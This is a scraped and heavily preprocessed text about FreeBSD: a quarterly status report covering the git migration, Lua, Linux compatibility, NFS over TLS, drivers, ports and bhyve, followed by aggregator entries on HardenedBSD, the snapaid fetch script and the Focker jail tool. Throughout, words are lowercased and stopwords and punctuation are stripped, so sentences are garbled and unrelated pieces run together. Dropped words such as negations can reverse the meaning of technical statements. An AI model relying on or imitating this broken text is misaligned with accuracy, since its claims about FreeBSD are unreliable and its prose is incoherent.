session please contact sponsor scaleengine inc video streaming contact quarterly status report quarterly frebsdorg contact daniel ebdrup jensen debdrup freebsdorg quarterly status report team collect publishes report reading right many improvement done recently thus believe useful quarterly status report team submits report change specific last quarter list anyway since write entry earlier report report built using makefiles among many advantage allows u easily sort report logically indeed starting report sorted logically sorted alphabetically within category conversion markdown docbook performed using python script known bug salvadore rewritten script using perl fixing bug feature missing many improvement possible script unlikely receive change since become obsolete soon conversion hugoasciidoctor completed another perl script ease preparation mail version report written one perl script written allow quarterly team send quarterly call automatically using cron job used quarter first time might noticed last quarterly call sent freebsdquarterlycalls new mailing list subscribe receive call quarterly report please note moderated list low traffic high signal noise ratio read carefully last quarterly call noticed ask send report quarterlysubmissions instead quarterly done help quarterly team distinguishing internal discussion submission please keep mind however quarterly team prefers receiving pull request ease administrative work would like thank philip postmaster team created freebsdquarterlycalls mailing list quarterlysubmissions address u project span multiple category kernel userspace port collection external project contact freebsd integration service team bsdic microsoftcom contact wei hu whu freebsdorg contact liwen hsu lwhsu freebsdorg hyperv socket freebsd implemented wei checked freebsd head branch may support guesthost communication without need networking hyperv azure feature rely available guest detail hyperv socket available project sponsored microsoft liwen working freebsd release code related azure current branch workinprogress available image azure marketplace published work image azure marketplace progress project sponsored freebsd foundation contact ed maste emaste freebsdorg contact warner losh imp freebsdorg contact ulrich spörlein uqs freebsdorg work continues freebsd migration subversion git ulrich iterated update order improve fidelity conversion particularly regard vendor contrib code update believe conversion acceptable state may make minor adjustment additional issue found expect push modification converter every two week first third sunday month mean commit hash beta repo remain stable least two week time allow others test experiment beta repo working updating freebsd process documentation includes writing git primer akin existing subversion primer update security team tool process release engineering update port package process update interest migration git encouraged subscribe freebsdgit mailing list test beta src port andor doc repository also welcome check wiki issue readme documentation git conversion tooling repo expect ready migration next quarter sponsor freebsd foundation part contact ed maste emaste freebsdorg contact kyle evans kevans freebsdorg contact ryan moeller freqlabs freebsdorg lua small efficient scripting language freebsd imported freebsd use bootloader since several project outside bootloader gained amount traction lua usage usrlibexecflua installed internal usage makesyscallssh rewritten lua pkg gained support lua script lldb base system support lua scripting freebsd lua flua version lua interpreter several module builtin convenient usage within base system flua installed nonstandard name location included path accidentally found thirdparty software configure script freebsd project make guarantee upgrade cadence module stability said available use downstream project freebsd user aware limitation previous work flua includes example adding libucl support future work includes libifconfig support scripting usage people interested working lua freebsd welcome get contact discus project idea name couple potential project interesting module started could prove useful listed particular order libcrypt libexpat libjail libnv libxo contact edward tomasz napierala trasz freebsdorg earlier linuxulator work focused code cleanup improving diagnostic tool work shifted cleanup fixing actual application current status tracked linux app status wiki page initial focus application nt involve mostly tend easier test debug bug fix applicationspecific example problem fixed include buggy madvise handling could break application linked jemalloc uname returning wrong result bit apps caused problem steam recvmsg accept broken circumstance breaking redis missing support soreuseport sosndbufforce sorcvbufforce soprotocol spammed log file running python regression test suite default soft open file limit automatically adjusted several linux apps iterate file descriptor limit instead using closefrom ongoing work cleanup debugging framework linux compatibility logging warning unrecognized system call parameter adding compatlinuxdebug sysctl turn warning linux test project test run part freebsd continuous integration infrastructure upgraded snapshot raised number test case predictably also number failure still lot sponsor freebsd foundation contact rick macklem rmacklem freebsdorg effort improve nfs security internet draft expect become rfc soon specifies use tl encrypt data traffic sun rpc connection used nfs although nfs able use encrypt data wire requires kerberos environment widely adopted also required encryptiondecryption done software since rpc message nfs argument encrypted since kernel tl capable using hardware assist improve performance require kerberos nfs tl may widely adopted implementation available project implement largely completed code slowly merged headcurrent least kernel portion support client laptop daemon perform tl handshake may optionally handle client certificate site local ca export option require client provide valid certificate code available testing see http peoplefreebsdorgrmacklemnfsovertlssetuptxt setting system testing still little awkward explained rough document main limitation current implementation us change kerntls rx patch includes support also testing pnfs configuration yet done tested soon third party testing would appreciated update kernel subsystemsfeatures driver support filesystems contact oleksandr tymoshenko gonzo freebsdorg soc audio framework made good progress since last report support aux device added device like auxiliary amplifier part main codec chip verify framework design following audio driver added recording support codec allwinner alwinners codecs pine recording playback current work progress codec codec pinebook pro contact chuck tuffli chuck freebsdorg university new hampshire interoperability laboratory aka unh iol develops suite test determine nvme device conforms specification interoperable nvme product quarter undertook getting bhyve emulated nvme device pas mandatory test change include implement flush command implement format nvm command implement aer support implement namespace identification descriptor fix active namespace list fix queue creation deletion validate deallocate range value handle zero length dsm range fix get log page command implement smart data io statistic validate lba start count add basic firmware commit support add compliant getset feature add feature interrupt vector config fix get feature predictable latency also good opportunity restructure part code make modular easier enhance includes convert logging statement parameterized macro refactor io command handling add lock around queue access consolidate cq update base pcinvmeioreq size advertised mdts help testing andor commenting code review contact marc veldman marc bumblingdorkcom bluetooth wireless technology creating personal network connecting peripheral like keyboard mouse also speaker heart rate monitor freebsd limited bluetooth basic rate br support functional bluetooth low energy le support quarter many small improvement made help development bluetooth le support number command added hccontrol mainly le function possible scan le device within range using hccontrol panic occurred enabling le support also fixed work still needed add attribute protocol att generic attribute profile gatt support contact emmanuel vadot manu freebsdorg drm driver freebsd updated match linux brings u little bit closer last lts release linux current plan first update driver match look making work ready release sponsor freebsd foundation contact emmanuel vadot manu freebsdorg dts file device tree source updated par linux head branch contact michal krawczyk mk semihalfcom contact artur rojek ar semihalfcom contact marcin wojtas mw semihalfcom ena elastic network adapter smart nic available virtualized environment amazon web service aws ena driver support multiple transmit receive queue handle gb network traffic depending instance type used completed since last update fix rx refill improve stability low memory condition also released erratum notice upstream driver introducing add driver support upcoming hw feature reporting tx drop disabling meta caching add sysctl tuneables io queue number create io queue optional size backoff rework way configration drbr rx ring size robust stable new hal version driver marked epoch ready default r key created using rng improve security minor fix improvement mfc ena driver freebsd sponsor amazoncom inc contact chuck silver chs freebsdorg contact kirk mckusick mckusick mckusickcom commit may enables ufs file system forcible unmount underlying medium fails becomes inaccessible example usb flash memory card hosting ufs file system unplugged rest report describes detail forcible unmounts done surprisingly le line file system code added changed strategy handling disk io error soft update enabled stop writing disk affected file system continue accept io request report future writes file system disk actually succeed initiate asynchronous forced unmount affected file system two case disk io error enxio mean disk gone lower layer storage stack already guarantee future io disk succeed eio error mean particular io request failed subsequent io request disk might still succeed enxio clear error continue know file system affect ondisk state see error eio error arrange geomvfs layer reject future io request enxio like done geomvfs orphaned case file system code clear error proceed forcible unmount new treatment io error needed writes buffer involved dependency dependency described structure attached buffer bdep field created processed result completion dependency attached buffer clearing dependency require read example dependency requires inode written disk block containing inode must read updated inode copied place buffer buffer written back disk often needed buffer already memory used need read disk read fail fabricate buffer full zero pretend read succeeded zeroed buffer updated written back disk case buffer full zero cause code wrong thing reading inode buffer containing inode still inode dependency memory reinitialize effective link count ieffnlink based actual link count inlink read handle case store inlink value wrote inode dependency restored zeroed buffer thus keeping tracking inode link count consistent application depend knowing attempt write data stable storage failed fsync msync system call need return error data fails written stable storage operation return enxio every call made file file system otherwise ignoring io error sponsor netflix contact oleksandr tymoshenko gonzo freebsdorg imx family application processor nxp based core initial code drop platform support includes ccm driver clock implementation gpc driver clock tree imx quad driver imx reused imx system relatively minor modification common change include adding clock support extending list fdt compat string linked patch freebsd successfully booted multiuser nfs root sbc contact bjoern zeeb bz freebsdorg intel wireless card one commonly used asked freebsd notebook project three main goal newer intel wireless device support newer wifi standard support intel wireless integration client support infrastructure freebsd first one needed iwm currently support latest generation intel wireless card second needed freebsd iwm even support third one want catch use improvement new wifi standard offer eg speed one decision made rather improving iwm work us duallicensed native linux driver bsd license linuxkpi framework stay close upstream possible first step give u several advantage full support card quick support new chipsets vendor bug fix also ability contribute back point lower level hardware attachment firmware loading initialisation work plan release patchset testing midjuly see currently supported unsupported hardware detected first cut support wireless operation yet follow later year want help testing please watch freebsdwireless list sponsor freebsd foundation contact konstantin belousov kib freebsdorg since introduction long mode aka execution mode freebsd terminology us paging structure provides bit virtual address space freebsd evenly divide space userspace kernel giving virtual address bit near future intel cpu start providing paging structure ie giving bit virtual address mean preservation existing divide kva uva bit uva time virtual memory pmap modified support defaulting hardware support tunable provided force using even hardware interesting part patch switch boot paging mode loader either legacy uefi pas control kernel long mode implies paging turned necessarily mean mode sdm state paging mode switched long mode active kernel create new page table structure turn long mode load new finally reenable long mode decided provide larger virtual address space usermode initial step leaving kva layout intact main motivation changing kva arrangement requires changing autotuning setting deserve separate work another argument kernel memory nonswappable overcommited ratio useful kva physical memory due direct map machine get physical address line increasing kva useful decided creating paging structure kernel pmap existing one quite straightforward need add one page top level create one entry point existing page create famous selfreferential entry vtopte vtopde care taken provide binary compatible layout uva binary executed correctly larger address space instance program could knowledge used bit address used upper bit data implemented compressed pointer even system run mode specific binary request uva procctl flag freebsd feature elf note since access machine development done using qemu would interesting try real hardware sponsor freebsd foundation contact konstantin belousov kib freebsdorg freebsd already provides excellent support superpages manner completely transparent application try proactively prevent fragmentation reserve contiguous run physical page linear allocation managed object autopromote run small page form complete superpage shortcoming approach directly follows strength application want get guaranteed superpage mapping typically underlying physical memory also offloaded hardware also memory mapping unit instance infiniband rmda adapter memory registration remapping efficient large page case transparent nonguaranteed support used extension developed posix shared memory subsystem allow creator request shared memory object backed physically contiguous page run specified size mmap syscall aware object requested mapping properly aligned served superpages new type shared memory object backed modified physical pager allocates contiguous physical memory vm ensures mapping object never split clipped nonsuperpage boundary fault handler specially optimized fast quickly installing superpage pte avoid touching small page constituing currently required pmap support provided superpage size sponsor freebsd foundation contact marcin wojtas mw semihalfcom contact artur rojek ar semihalfcom contact dawid gorecki dgr semihalfcom semihalf team initiated working freebsd support nxp soc quadcore processor integrated packet processing acceleration high speed peripheral including gb ethernet pcie sata usb wide range networking storage security industrial application completed since last update todo sponsor alstom group contact konstantin belousov kib freebsdorg freebsd kernel virtual memory subsystem handle normal application memory ie anonymous filebacked shared private mapping called managed page managed page fully controlled vm track status particular managed page made readonly writeback file unmapped reuse paging machinedependent vm layer pmap must support managed page instance must provide operation pmapremovewrite downgrade mapping readonly pmapremoveall unmap page address space implement kind operation causing overhead scanning page table pmap must track existing mapping page tracking done allocating small data structure pv entry per mapping linking pv entry given page pv list since pv entry come context different address space pmap must provide synchronization guarantee correctness list structure current pmap allocates one mutex per one physical superpage numa configuration maxcpu lock hashed page physical address nonnuma end result often undeserved lock aliasing causing pv list lock contention since page superpage share lock reservation typically cause adjusted page come superpage proposed patch creates new kernel synchronization primitive called one byte mutex embedded currently unused padding machinedependent portion struct vmpage way page get dedicated pv list lock without using memory everimportant buildkernel benchmark nonnuma config change provides reduction system time one complication old locking distribution scheme made natural fit superpages promotion demotion since embedded small page shared pv list lock operation basically foldunfold corresponding pv entry promotion demotion operation require taking lock constituent small page provides small measurable impact possible optimize providing superlock first page superpage run affected operation relatively rare even obvious implementing optimization would slow pathes another important nuance pv entry handling sometimes pv entry allocator must fail typically required kernel make call pmapenter must establish new mapping managed page includes allocating pv entry existing reused allocator get fresh page vmpagealloc opts destroy managed mapping either get reusable pv entry current pmap destroy enough managed mapping pmap free whole page reclamation currently page pv entry allocated linked global pv chunk list protected global pernuma domain mutex allocation free pv entry lock mutex apparently contention point large machine patch remove global list chunk instead linking pmaps global list like done different reason global lock taken pmap creation free corresponds forkexec exit process pv allocator start reclaiming pmaps normally happen sponsor freebsd foundation contact alexander chernikov melifaro freebsdorg primary goal work bring scalable routing multipath implementation enabled default another goal enabling highperformance routing lookup multipath close longstanding feature gap modern networking o must lockless routing lookup remove lookup bottleneck improve dataplane control plane performance setup large number route background initial routing kpi introduced back nice generic approach back one knew protocol would evolve enormously successful able survive year unfortunately kpi try protect subsystem internals outside user resulting tight coupling subsystem result making change hard leading compromise piling technical debt implementation overview change based introduction concept nexthops nexthops separate datastructures containing necessary information perform packet forwarding gateway interface mtu shared among route providing precomputed cacheefficient data requiring le memory interested reader find detailed description another overview found nexthop object talk describing linux implementation multipath implementation extends nexthop concept introducing nexthop group route pointer either nexthops nexthop group decoupling lookup algorithm routing stack internals nexthops nexthop group immutable use epoch backed reclamation prerequisite lockless routing lookup introduction modular lookup framework allowing attach longestprefixmatch algorithm implementation fib currently plan use modified algorithm dpdk family example base lockless implementation status contact allan jude allanjude freebsdorg zstandard zstd modern highperformance compression algorithm designed provide compression ratio gzip offering much better performance zstd adopted freebsd number us including compressing kernel crash dump replacement gzip bzip compressing log file future version pkg effort complete integration zstd zfs sponsored freebsd foundation integrating zstd zfs extend transparent compression feature zfs offering higher compression ratio without performance penalty associated gzip zstd offer compression level ranging low compression maximum compression plus zstdfast level offer le compression even greater speed allow storage administrator select performancevscompression tradeoff best suit need task remaining completed extend zfs support compression algorithm large number level solve issue around inheritence compression setting restore compression level reading block disk create futureproofing scheme handle changing version zstd extend zfs replication handle backwards compatibility pool yet support zstd resolve issue around backwards compatibility zstd configured used sponsor freebsd foundation contact alex richardson arichardson freebsdorg contact andrew turner andrew freebsdorg contact brook davis brook freebsdorg contact edward tomasz napierala trasz freebsdorg contact jessica clarke freebsdorg contact john baldwin jhb freebsdorg contact robert watson rwatson freebsdorg contact ruslan bukin br freebsdorg cheribsd extends freebsd implement memory protection software compartmentalization feature supported cheri instruction set extension support cheririscv cheribsd continued mature quarter tandem refinement cheririscv architecture recently made cheribsd pure capability cheriabi process environment default abi rather compatibility layer grown support dynamically linked binary previously staticallylinked binary supported c including exception sealed return address function pointer capability sentry provide additional cfi protection initial mmu protection loading storing tag point cheririscv support cheribsd generally par support cherimips much effort focused preparing cheribsd cheririscv inclusion demonstrator system darpa finding exploit thwart tampering fett bug bounty program addition work begun quarter porting cheribsd arm morello soc morello prototype demonstrator board add cheri extension recently switched devbranch model active work take place dev branch periodically merge master synchronization cheribsd dependency like cherillvm interested like program cheri recently released cheri cc programming guide updating platformspecific feature bringing support new hardware platform contact edward tomasz napierala trasz freebsdorg quite freebsd ci infrastructure running freebsd build regression test making easy spot regression ci building image architecture regression test run mean could nt detect architecturespecific runtime breakage architecture pose problem freebsd also people working freebsd fork cheri project university cambridge sri international goal project run regression test remaining architecture supported freebsd arm mips power riscv test run using common mostly machineindependent script required change make possible use qemu addition bhyve hypervisor used test sysutilsubootqemuarm port added port collection finally architecture required tweak account different configuration requirement example mips kernel nt support virtio disk even ahci whereas uboot get confused one virtio disk arm currently failure skipped test test ran http failure skipped http mips failure skipped http power riscv result available yet remaining work failing regression test need fixed test quite slow qemu example run take five hour running automatically commit would quickly overload ci cluster solution would eg run daily job still fail produce result deadlock end regression test suite due unkillable process panic randomly kyua often crash jemalloc assertion might fixed upcoming qemu port update sponsor darpa contact mitchell horne mhorne freebsdorg contact freebsdriscv mailing list contact irc freebsdriscv channel freenode freebsdriscv project providing support running freebsd riscv instruction set architecture since riscv still young evolving platform one goal freebsd wellsupported option user riscv hardware increase availability quarter saw number improvement boot process physmem interface used arm enumerate physical memory resource moved machineindependent code adopted riscv result kernel able detect exclude physical memory reserved device firmware bug prevented kernel using physical memory load address fixed typically manifest much waste kernel loaded start physical memory default future boot configuration impact would much larger port opensbi updated bringing several new feature fix particular brought hardware state management hsm extension used start stop cpu freebsd use extension whenever detects available also lot work done port freebsd standard bootloader loader riscv big advantage term boot flexibility brings u closer needed produce official freebsdriscv release image leveraging uefi support uboot loaderefi used manner similar arm next quarter likely bring uboot port riscv target pending release booting kernel directly via sbi firmware continue supported change affecting base system program contact stefan esser se freebsdorg contact gavin howard yzenatech gmailcom new version bc dc imported freebsdcurrent enabled default import planned end july enabled default require withghbcyes set etcsrcconf version developed gavin howard goal provide highly portable posix compatible implementation offer gnu bc compatibility dropin replacement bc freebsd except standardviolating behavior bc currently freebsd eg modulo operator additional feature high performance factor faster current freebsd implementation test support message catalog large number language supported current release contribution translation welcome extra builtin function operator extended library advanced math function detailed manpage explaining standard conformant extended feature one shared binary bc dc bc preprocessor relies dc actual computation dc feature supported dc execution subprocesses since author considers security hazard calculator code also available port package mathghbc ghbc eg use freebsd binary release contact ed maste emaste freebsdorg working migrating modern copyfree permissively licensed toolchain quite time last quarter retired two obsolete gnu bintuils objdump many us objdump replaced readelf llvmobjdump also available base system port depend objdump updated rely gnu binutils port package gnu utility used base system port objdump port require gnu generally updated depend binutils one file base system skeinblockasms proved troublesome earlier attempt migrate using clang integrated assembler ia however update clang trivial modification source ia assemble file gnu objdump removed freebsdcurrent absent freebsd todo final task binutils retirement project remove gnu gdb currently retained crashinfo sponsor freebsd foundation contact konstantin belousov kib freebsdorg rtld get number small bug fix improvement rtlddeepbind dlopen flag implemented despite strange even unsafe idea compatibility glibc several improvement direct execution mode made interesting perhaps v switch report configuration parameter rtld ability specify different executed binary name fix properly set osrelabi directly executed binary linkmap structure used tool need know list loaded shared object like gdb wine made compatible glibc keeping existing freebsd abi intact course linkmap work become apparent rtld sometimes need report presence feature deduced runtime test symbol presence function behavior scheme reporting feature uniformingly named symbol designed see rtld manpage current explanation positionindependent pie binary freebsd marked flag otherwise binary etdyn object quite hard distinguish proper dynamically shared object dso pie binary problem binary static linker strip information required proper loading dso additonally binary contains relocation like copyrelocations handled nonmain binary flag addition rtld properly detects binary refuse load dlopen dtneeded dependency ldd also misdetected pie v dso required fix parse dynamic segment try dlopen sponsor freebsd foundation contact oleksandr tymoshenko gonzo freebsdorg vhdx successor microsoft vhd virtual drive file format increase maximum capacity virtual drive introduces feature better handle powersystem failure vhdx required format generation hyperv vms change affecting port collection whether sweeping change touch tree individual port contact christer edward christeredwards gmailcom bastille opensource system automating deployment management containerized application freebsd bastille template automate container setup allowing easily reproduce container needed bastille available port sysutilsbastille status bastille merged exciting new feature github change include experimental support new bastillefile template syntax added mount umount subcommands added default vagrantfile simple testing experimental support empty container improvement vnet dhcp support cosmetic bugfixes error output extended config file documentation updated bastille help output option f force destroy container sysutilsbastille updated latest new bastille template added quarter include everything mentioned done quarantine special thanks everyone contributed time contact adriaan de groot kde freebsdorg kde freebsd project package software produced kde community freebsd software includes full desktop environment kde plasma ide kdevelop pim suite kontact hundred application used freebsd desktop machine quarter eversopeculiar one used working remotely collaborating internet update port tree qualitatively different whole world lock meanwhile software continues released quarter kde team restored patch close remote tcp held application use ice library thanks colin percival reporting went missing one port update prevent future patch upstreamed pr chased kdeadjacent software like cmake cutelyst lattedock nheko new release particular cmake take lot effort every time buildtime dependency port graphicspoppler updated latest upstream release lowlevel dependency many documentviewing application like cmake requires chasing lot software poppler one component shared various software stack desktop environment desktop group kde participates kde framework release like clockwork reaching kde framework midmay kde application kde release service really delivers library application addons one large release landing port tree also midmay monthly update midjune new wayland support kde plasma tested freebsd appeared duly packaged great deal preparation gone qt many port preemptively patched new last lts release qt update yet landed pending last bit fallout kde team would like thank antoine many expruns mikael useful tip swill patience kai dealing webengine next big round update kde stack slated cmake qt lts kde framework contact gleb popov haskell freebsdorg haskell generalpurpose strictlytyped pure functional language haskell freebsd project strives provide uptodate haskell toolchain well various application written language quarter brought longawaited ghc update version along compiler haskell build system frontend cabalinstall also upgraded update numerous haskell port updated existing port haskell application migrated usescabal implement gostyle build proccess dependency compiled part build consequence port haskell library deprecated removed upgrading ghc became tedious task single person new github repository created freebsd organization freebsdportshaskell right work done preparing another ghc upgrade branch contribution welcome contact henri hennebert hlh restartbe rtsx driver realtek sd card reader ported openbsd development snapshot available via sysutilsrtsxkmod port march may code completed help gary jennejohn gj jesper schmitz mouridsen jsm tweak imported linux counterpart driver successfully tested head lenovo thinkpad hp probook lenovo thinkpad lenovo ideapad head intel lenovo thinkpad dell latitude acer aspire e driver also work realtek test welcome especially device yet tested device may require tweak contains bulk exchange completion code contact paul floyd paulf freefr contact kyle evans kevans freebsdorg large amount work done rebase freebsd support top valgrind address numerous test suite failure currently almost regression test pas major improvement current state affair valgrind quite date missing important functionality followup work aim make freebsd officially supported target platform valgrind develvalgrinddevel port process updated point new work noteworthy change documentation tree manpages external booksdocuments contact danilo g baio dbaio freebsdorg contact edson brandi ebrandi freebsdorg quarter improved renderization rtl righttoleft language freebsd documentation faced issue first rtl language joined translation effort fair looking forward receive language translator project well status language want thank everyone contributed translating reviewing document please help promote effort local user group always need volunteer object defy categorization contact dan langille dan langilleorg freshports sister site freshsource reported upon freebsd commits year cover commits port freshports track commits extract data port makefiles create database information useful port developer port user example http wwwfreshportsorgsecurityacmesh show history port back creation may git work git started back september ignored started back midjune creation new gitspecific jail commit ingres commit processing gitdev website serhii sergey kozlov created script transform git commit entry xml digestible freshports huge step foward effort next step include help wanted git far away could use helper thank package freshports display package version available repo source cover primary tier eg secondary tier eg help us know version expect repo last built dependency line thing easiest done via copypaste working port makefile need add new dependency freshports show dependency line port example acmesh securityacmesh library also covered feature python port recently adjusted display pythonpkgnameprefix virtualenv develpyvirtualenv instead develpyvirtualenv read change issue http watch port maintain search page long port maintain button logged feature recently branched new automated watch list option watch port maintain report subscription notify commits port maintain email address freshports must match value maintainer field port always daily report time time infrastructure change occur touch port feature ensures know change repology link repology link requested allows see version port repository system link repologyorg appears every port page reading based upon thing know freshports many thing freshports including search makefile pkgplist recent blog post provides example dependency line eg list dependency port list port depending upon port see default configuration option package install given file eg binunzip find port person maintains find makefiles contain reference bunzip search result plaintext consisting list foobar port maximum effort checkbox search page nothing committers notified sanity test failure commit find commit commit based svn revision number eg http wwwfreshportsorgcommitphp javascript help wanted recently upgraded outdated javascript module broke javascript based graph http could use help fixing please starting point listed url need working website play please contact ssh publickey sponsor hardware provided ixsystems contact anatoli anatoliws contact callum callum aitchisonorg contact peter grehan grehan freebsdorg bhyve hypervisor support running variety guest operating system virtual machine bhyve includes support pci device passthru technique pas host pci device virtual machine exclusive control use year pci passthrough ppt bhyve working intel system openbsd guest due two bug first one crashing freebsd host bhyve started ppt intel processor two vtd translation unit iommu included skylake newer intel processor second bug preventing correct interrupt handling openbsd guest result openbsd guest running bhyve able use pci device passed host last month second bug identified fixed backported possible fully take advantage pci passthrough ppt bhyve productionready release version typical case ppt pas guest network adapter complete control also pas usb device including external hdds note though passthrough vga gpu device supported yet detail see link particularly interesting case ppt use openbsd guest firewall router freebsd server ppt achieve inside single server could pas openbsd guest network adapter connected internet would take complete control filtering traffic could pas good packet via virtual network interface guest host network adapter passed freebsd host nt see hence nt handle network traffic nt even initialize adapter eg case wifi card guest load firmware simple term host pass device interrupt guest come hardware everything related device management happens inside guest danger network traffic exploit issue host network stack cause host crash misbehave way contact thierry thomas thierry freebsdorg sagemath free opensource mathematics software system licensed gpl build top many existing opensource package numpy scipy matplotlib sympy maximum gap flint r many thanks sagemath possible access combined power common pythonbased language directly via interface wrapper goal creating viable free open source alternative magma maple mathematica matlab complex port lot dependency broken time upstream working easing packaging many previously bundled application replaced external package interested would nice create team maintainer many project build upon freebsd incorporate component freebsd project project may interest broader freebsd community sometimes include brief update submitted project quarterly report freebsd project make representation accuracy veracity claim submission contact oleksandr tymoshenko gonzo freebsdorg chaifi tui text ui utility aimed simplifying process joining public wifi network place like coffee shop library replaces process scanning manually editing wpasupplicantconf interactive dialog utility way replacement fullfeatured network manager major desktop environment still working console using tiling window manager may save second worst case minute time contact alfonso sabato siciliano alfonsosiciliano emailcom mixertui volume mixer terminal user interface built freebsd sound system show current sound driver configuration select audio device get information change volume set default last feature allows switch easily audio fromto laptop hdmi headphone speaker mixertui installed via audiomixertui port would like thank freebsd community tip feedback patch improve project contact stephan lichtenauer sl honeyguideeu pot jail management tool also support orchestration nomad potluck aim freebsd pot dockerhub linux docker repository pot flavour complete image usage pot simplify setting complex software many package port comparison manual configuration potluck aim provide content library additional layer abstraction top existing infrastructure like pkg pot offer pot flavour file provided github http githubcomhnygdpotluck fed jenkins instance potluck repository flavour detailed description well readymade image imported pot provided initial project set three simple flavour along complete jitsi meet instance jail created proof concept allow running fullyfledged video conference system easy command within minute initial version set implemented far general feedback test well additional useful flavour welcome news home status home
52,Lobsters,freebsd,FreeBSD,HardenedBSD July 2020 Status Report,https://hardenedbsd.org/article/shawn-webb/2020-07-14/hardenedbsd-july-2020-status-report,hardenedbsd july status report,completed documenting,filesystem extended attribute support work completed time progress port marked toggle started documenting port marked exploit mitigation toggled different subject hosting network stability since migration build infrastructure blackhawknests hosting facility number networkrelated issue especially regard network stability stability issue hopefully worked morning also talk verizon fios hopefully switch fios installation completed switch also drastically increase available bandwidth also working migrating gitea instance using sqlite database backend mysql migrating mysql drastically increase speed stability selfhosted git service keep hardenedbsd community updated progress def con jeff moss donated fund new development laptop received last week migrating selfhosted git service work completed plan start completing safestack integration safestack applied shared object opening door applying safestack entire ecosystem base world port
53,Lobsters,freebsd,FreeBSD,Script to Fetch FreeBSD Snapshots/Releases) Very Easy,https://funkthat.com/gitea/jmg/snapaid,script fetch freebsd snapshotsreleases easy,snapaid quick start note http pgpkeyjmg backend,snapaid utility make easier find download correct snapshot also fetch verify gpg signature hash snapshot ensure getting correct file quick start file needed snapaidsh script file used generating index wget http wwwfunkthatcomgiteajmgsnapaidrawbranchmastersnapaidsh chmod snapaidsh snapaidsh find note repository signed freebsd gpg key available http pgpkeyjmg snapaid migrated github gitea see verified lock icon commits unlike github gitea wo nt falsely show commit verified unless signed user pgp key note xz v nonxz version image able differentiated currently sorting rule always put xz version nonxz version note snapshot hash included excludes snapshot tool could updated include priority currently mostall available download backend backend simple text file index published snapshot built email freebsdsnapshot list verification email signature entry line extracted file name parsed added complete index messageid email index frontend dl original email verify gpg signature locally complete index used verifying snapshot already downloaded another index also maintained contains currently available dl snapshot may contain snapshot longer exist updatedchecked new snapshot released procmail rc line use deliveredto freebsd announce freebsdorg homebinsnapwrapsh deliveredto freebsd snapshot freebsdorg mlsnapshots homebinsnapwrapsh first rule used release announcement copied c later rule file proper mailbox second rule snapshot smiilarly organized mailbox filing happens snapwrapsh script included repo command deploy database freebsdorg server deleted simple tar cf file ssh freefall tar xf type command
54,Lobsters,freebsd,FreeBSD,Focker is FreeBSD Image Orchestration Tool in Vein of Docker,https://github.com/sadaszewski/focker,focker freebsd image orchestration tool vein docker,focker introduction basic usage guide table content installation installing python package pypi installing python package github setting zfs preparing base image usage command syntax focker imageimgimi focker jailj focker volumevolv focker composecompc syntax syntax image jail volume command reading example conclusion link,focker introduction focker freebsd image orchestration tool vein docker page contains detailed reference focker functionality first time using focker please refer basic usage guide first table content installation order use focker need zfs pool available freebsd installation installing python package pypi run installing python package github run git clone http githubcomsadaszewskifockergit cd focker python setuppy install want uninstaller git clone http githubcomsadaszewskifockergit cd focker python setuppy sdist pip install setting zfs upon first execution focker command focker automatically create necessary directory zfs datasets need exclude unlikely case already using focker filesystem hierarchy layout initialization look following focker fockerimages fockerjails fockervolumes image jail volume corresponding zfs datasets canmountoff serve mountpoint anchor child entry preparing base image bootstrap image system need install freebsd jail mode zfs dataset placed fockerimages provide two userdefined property focker focker tag one way achieve would following using bash shell tag freebsdlatest freebsd freebsdversion cut version freebsd freebsdversion echo n version name zfs create focker focker tag tag zrootfockerimages name bsdinstall jail fockerimages name zfs set readonlyon zrootfockerimages name zfs snapshot zrootfockerimages name usage point focker ready use focker command syntax focker command single entrypoint focker functionality overview syntax presented tree focker command root first level descendant represents choice level mode image jail volume compose second level level mode dependent mode final third level list required optional argument specific given combination mode focker imageimgimi buildb fockerdir tagst tag tag tagt reference tag tag untagu tag tag listlsl prunep remover reference removedependentsr jailj createc image commandc command default binsh enve varn valuen mountsm fromn onn hostnamen hostname start reference stop reference remover reference exece reference command oneshoto image enve varn valuen mountsm fromn onn command listlsl tagt reference tag tag untagu tag tag prunep forcef volumevolv create tagst tag tag prune list tag reference tag tag untag tag tag composecompc build filename run filename command individual combination briefly described focker imageimgimi focker image mode group command related focker image buildb fockerdir tag tag tag build focker image according specification fockerfile present specified fockerdir fockerfile syntax straightforward explained tagt reference tag tag applies one tag given image reference image one existing tag first character long unambiguous untagu tag tag remove one image tag listlsl list existing focker image optionally full checksum instead default first character prunep greedily remove existing focker image without tag without dependent remover reference remove specified image focker jailj focker jail mode group command related fockermanaged jail createc image commandc command enve varn valuen mountsm fromn onn hostnamen hostname creates new fockermanaged jail jail consists clone given image entry etcjailconf configuration entry us execprestart execstart specify runtime environment mount environmental variable set also call command last execstart specified command default binsh hostname specified using hostname parameter mount environment variable provided tuples separated colon environmental variable specification consists variable name followed variable value mount specification consists path followed path path local system path volume name start reference start given jail specified reference reference existing jail one existing tag first character long unambiguous command equivalent calling jail c stop reference stop given jail specified reference command equivalent calling jail r remover reference remove given jail specified reference jail stopped running filesystems mounted root directory unmounted zfs dataset entry etcjailconf removed exece reference command executes given command binsh specified given running jail specified reference command equivalent calling jexec oneshoto image enve varn valuen mountsm fromn onn command create new onetime fockermanaged jail syntax logic identical focker jail create difference hostname specified jail automatically removed command exit example focker jail oneshot freebsdlatest e foo bar l al listlsl list fockermanaged jail running jail jids displayed tag reference tag tag applies one tag given jail reference jail one existing tag first character long unambiguous untag tag tag remove one jail tag prune remove existing focker jail without tag focker volumevolv focker volume mode group command related focker volume create tagst tag tag create new focker volume optionally tagged given tag prune remove existing focker volume without tag list list existing focker volume full displayed f switch used otherwise first character shown tag reference tag tag applies one tag given volume reference volume one existing tag first character long unambiguous untag tag tag remove one volume tag focker composecompc focker compose mode group command related focker composition file fockercomposeyml build filename build image volume jail according specification provided file pointed filename run filename command run one command specified command composition file pointed filename fockerfile syntax sample fockerfile pasted base freebsdlatest step copy tmpx etcx filesy etcy copy filesz etcz run pkg install run pkg install pkg install pkg install run mkdir p persistetcssh sed e setcsshsshhostpersistetcsshsshhostg etcrcdsshd sed e setcsshsshhostpersistetcsshsshhostg etcsshsshdconfig sed e hostkeyhostkeyg etcsshsshdconfig fockerfile currently support two entry base step base specifies parent image top operation described step executed entry step result creation new image focker determines checksum step corresponding image already exists step skipped work continues top existing image powerful paradigm image building experimentation split task multiple step resume work last successful step case problem big time saver step list contain copy run entry copy entry specifies single one list copy operation local file image form tuples run entry specifies chain command executed within image list string single string fockercomposeyml syntax sample composition file illustrating principle pasted image jail wordpress image env sitename test site mount interface volume wpbackup command 